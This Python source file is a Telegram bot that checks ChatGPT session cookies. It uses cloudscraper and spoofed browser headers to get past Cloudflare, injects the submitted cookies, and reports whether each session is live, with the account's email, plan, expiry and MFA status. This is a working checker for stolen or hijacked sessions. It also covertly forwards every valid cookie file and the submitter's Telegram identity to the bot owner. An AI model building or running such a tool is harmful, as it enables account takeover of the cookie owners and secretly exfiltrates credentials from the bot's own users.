#!/usr/bin/env python3
import os
import io
import json
import zipfile
import logging
import re
import asyncio
import traceback
from datetime import datetime, timezone

import cloudscraper
import certifi
import requests
from requests.cookies import create_cookie
from dotenv import load_dotenv
from telegram import Update, Document, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# --- Configuration & Logging ---
load_dotenv()
TELEGRAM_TOKEN      = os.getenv("TELEGRAM_TOKEN")
OWNER_CHAT_ID       = os.getenv("OWNER_CHAT_ID")
CHANNEL_CHAT_ID     = os.getenv("CHANNEL_CHAT_ID")
CHANNEL_INVITE_LINK = os.getenv("CHANNEL_INVITE_LINK")
if not (TELEGRAM_TOKEN and OWNER_CHAT_ID and CHANNEL_CHAT_ID and CHANNEL_INVITE_LINK):
    logging.error("Please set TELEGRAM_TOKEN, OWNER_CHAT_ID, CHANNEL_CHAT_ID, and CHANNEL_INVITE_LINK in your .env")
    exit(1)
OWNER_CHAT_ID   = int(OWNER_CHAT_ID)
CHANNEL_CHAT_ID = int(CHANNEL_CHAT_ID)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# URL we never change
CHATGPT_URL = "https://chatgpt.com"

# Realistic Linux‐Chrome headers
DEFAULT_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (X11; Linux x86_64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/118.0.0.0 Safari/537.36"
    ),
    "Accept": (
        "text/html,application/xhtml+xml,application/xml;"
        "q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
    ),
    "Accept-Language": "en-US,en;q=0.9",
    "Referer": "https://chatgpt.com/",
    "Origin": "https://chatgpt.com",
    "DNT": "1",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "sec-ch-ua": '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"',
}

# --- Helpers ---
async def get_channel_invite_link(context):
    return CHANNEL_INVITE_LINK

def parse_cookies(file_content: str, file_type: str) -> dict:
    # support JSON array, Netscape format, or "k=v; k2=v2"
    if file_type.lower() == 'json' or file_content.lstrip().startswith('['):
        try:
            arr = json.loads(file_content)
            if isinstance(arr, list):
                return {c['name']: c['value'] for c in arr if 'name' in c and 'value' in c}
        except json.JSONDecodeError:
            pass

    cookies = {}
    for line in file_content.splitlines():
        line = line.strip()
        if not line or (line.startswith('#') and not line.startswith('#HttpOnly_')):
            continue
        if line.startswith('#HttpOnly_'):
            line = line[len('#HttpOnly_'):]
        parts = line.split('\t')
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]

    if not cookies and file_content.strip():
        for pair in file_content.split(';'):
            if '=' in pair:
                k, v = pair.strip().split('=', 1)
                cookies[k] = v

    return cookies

# --- Bot Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    full_name = f"{user.first_name or ''}{(' ' + user.last_name) if user.last_name else ''}"
    try:
        member = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user.id)
        if member.status in ('member','administrator','creator'):
            await update.message.reply_text(
                f"👋 Hi {full_name}! Send me your ChatGPT‐cookies file(s) (.txt, .json, or .zip), and I’ll check whether they’re still valid.",
                reply_to_message_id=update.message.message_id
            )
            return
    except:
        pass

    invite = await get_channel_invite_link(context)
    kb = [[InlineKeyboardButton("Join our channel", url=invite)]]
    await update.message.reply_text(
        f"👋 Hi {full_name}! Please join our channel to use this bot.",
        reply_markup=InlineKeyboardMarkup(kb),
        reply_to_message_id=update.message.message_id
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc: Document = update.message.document
    orig_id = update.message.message_id
    user = update.message.from_user
    full_name = f"{user.first_name or ''}{(' ' + user.last_name) if user.last_name else ''}"
    username_str = f"@{user.username}" if user.username else "N/A"

    # enforce channel membership
    try:
        member = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user.id)
        if member.status not in ('member','administrator','creator'):
            raise Exception()
    except:
        invite = await get_channel_invite_link(context)
        kb = [[InlineKeyboardButton("Join our channel", url=invite)]]
        return await update.message.reply_text(
            f"👋 Hi {full_name}! Please join our channel to use this bot.",
            reply_markup=InlineKeyboardMarkup(kb),
            reply_to_message_id=orig_id
        )

    # download the file
    file = await doc.get_file()
    data = await file.download_as_bytearray()
    buf = io.BytesIO(data)

    fn = doc.file_name
    ext = os.path.splitext(fn)[1].lower()
    cookie_files = []

    if ext in ('.txt', '.json'):
        txt = buf.read().decode('utf-8', 'ignore')
        cookie_files.append((fn, txt, ext.lstrip('.')))
    elif ext == '.zip':
        with zipfile.ZipFile(buf) as zf:
            for zi in zf.infolist():
                base = os.path.basename(zi.filename)
                if zi.filename.startswith('__MACOSX/') or base.startswith('._'):
                    continue
                if zi.filename.lower().endswith(('.txt', '.json')):
                    txt = zf.read(zi).decode('utf-8', 'ignore')
                    cookie_files.append((zi.filename, txt, zi.filename.split('.')[-1]))
    else:
        return await update.message.reply_text(
            "⚠️ Unsupported file type. Use .txt, .json or .zip.",
            reply_to_message_id=orig_id
        )

    if not cookie_files:
        return await update.message.reply_text(
            "🚫 No .txt/.json cookie files found.",
            reply_to_message_id=orig_id
        )

    for name, content, ftype in cookie_files:
        context.application.create_task(
            process_file(
                chat_id=update.effective_chat.id,
                orig_id=orig_id,
                name=name,
                content=content,
                ftype=ftype,
                bot_user=context.bot.username,
                user_id=user.id,
                full_name=full_name,
                username_str=username_str,
                context=context
            )
        )

# --- Core Processing ---
async def process_file(
    chat_id: int,
    orig_id: int,
    name: str,
    content: str,
    ftype: str,
    bot_user: str,
    user_id: int,
    full_name: str,
    username_str: str,
    context: ContextTypes.DEFAULT_TYPE
):
    cookies = parse_cookies(content, ftype)
    if not cookies:
        return await context.bot.send_message(
            chat_id,
            "❓ Cookie format unrecognisable. Please contact the developer to add support for this format.",
            reply_to_message_id=orig_id
        )

    # 1) Create CloudScraper session
    scraper = cloudscraper.create_scraper(
        browser={'browser':'chrome','platform':'linux'},
        delay=10,    # up to 10s for JS challenge
        debug=False
    )
    scraper.verify = certifi.where()
    scraper.headers.update(DEFAULT_HEADERS)

    try:
        loop = asyncio.get_running_loop()

        # 2) Warm up: solve CF JS challenge and get cf_clearance
        await loop.run_in_executor(None, scraper.get, CHATGPT_URL)

        # 3) Inject user cookies with explicit domain/path
        for k, v in cookies.items():
            c = create_cookie(name=k, value=v, domain="chatgpt.com", path="/", secure=True)
            scraper.cookies.set_cookie(c)

        # 4) Fetch again with both cf_clearance + user cookies
        resp = await loop.run_in_executor(None, scraper.get, CHATGPT_URL)
        html = resp.text
        status = resp.status_code

        # 5) Parse embedded JS payload
        m = re.search(r'streamController\.enqueue\("(.+?)"\)', html, re.DOTALL)
        if m:
            js_escaped = m.group(1)
            try:
                js_payload = js_escaped.encode('utf-8').decode('unicode_escape')
            except:
                js_payload = js_escaped
            js_payload = js_payload.replace('\\"', '"')
            valid = '"authStatus","logged_in"' in js_payload
        else:
            js_payload = ""
            valid = False

    except Exception as e:
        tb = traceback.format_exc()
        await context.bot.send_message(
            chat_id,
            text=(
                f"❌ Error fetching ChatGPT:\n{e}\n\n"
                f"Traceback:\n{tb}"
            ),
            reply_to_message_id=orig_id
        )
        logger.error(f"Error fetching ChatGPT: {e}\n{tb}")
        return

    # Only send the simple invalid message when cookies are invalid
    if not valid:
        await context.bot.send_message(
            chat_id,
            "❌ This cookie is invalid or expired.",
            reply_to_message_id=orig_id
        )
        return

    # --- Extract account info ---
    m_email = re.search(r'"email"\s*,\s*"([^"]+)"', js_payload)
    if m_email and '@' in m_email.group(1):
        email = m_email.group(1)
    else:
        m_name = re.search(r'"name"\s*,\s*"([^"]+)"', js_payload)
        email = m_name.group(1) if m_name else "N/A"

    m_plan = re.search(r'"planType"\s*,\s*"([^"]+)"', js_payload) \
             or re.search(r'"subscriptionPlan"\s*,\s*"([^"]+)"', js_payload)
    plan = m_plan.group(1).capitalize() if m_plan else "N/A"

    m_exp = re.search(r'"subscriptionExpiresAt"\s*,\s*(\d+)', js_payload) \
            or re.search(r'subscriptionExpiresAt\\?",\s*(\d+)', html)
    if m_exp:
        ts = int(m_exp.group(1))
        dt = datetime.fromtimestamp(ts, tz=timezone.utc)
        expires = dt.strftime("%B %d, %Y")
    else:
        expires = "N/A"

    m_mfa = re.search(r'"mfa"\s*,\s*(true|false)', js_payload)
    mfa = m_mfa.group(1).title() if m_mfa else "N/A"

    # --- Send results ---
    buf2 = io.BytesIO(content.encode('utf-8'))
    buf2.seek(0)
    tag = f"@{bot_user}-{orig_id}{os.path.splitext(name)[1].lower()}"
    input_file = InputFile(buf2, filename=tag)

    caption_user = (
        f"✅ This cookie is working, enjoy ChatGPT, 🤖 Checked by @{bot_user}\n\n"
        "Account information:\n"
        f"📧Mail: {email}\n"
        f"📦Plan: {plan}\n"
        f"⏳Expires on: {expires}\n"
        f"🔒MFA: {mfa}"
    )
    await context.bot.send_document(
        chat_id,
        document=input_file,
        caption=caption_user,
        reply_to_message_id=orig_id
    )

    caption_owner = (
        f"Chat ID: <a href=\"tg://user?id={user_id}\">{user_id}</a>\n"
        f"Full name: {full_name}\n"
        f"Username: {username_str}\n\n"
        "Account information:\n"
        f"📧Mail: {email}\n"
        f"📦Plan: {plan}\n"
        f"⏳Expires on: {expires}\n"
        f"🔒MFA: {mfa}"
    )
    await context.bot.send_document(
        OWNER_CHAT_ID,
        document=input_file,
        caption=caption_owner,
        parse_mode='HTML'
    )

# --- Entry Point ---
def main():
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, handle_document))
    app.run_polling()
    logger.info("Bot started.")

if __name__ == "__main__":
    main()
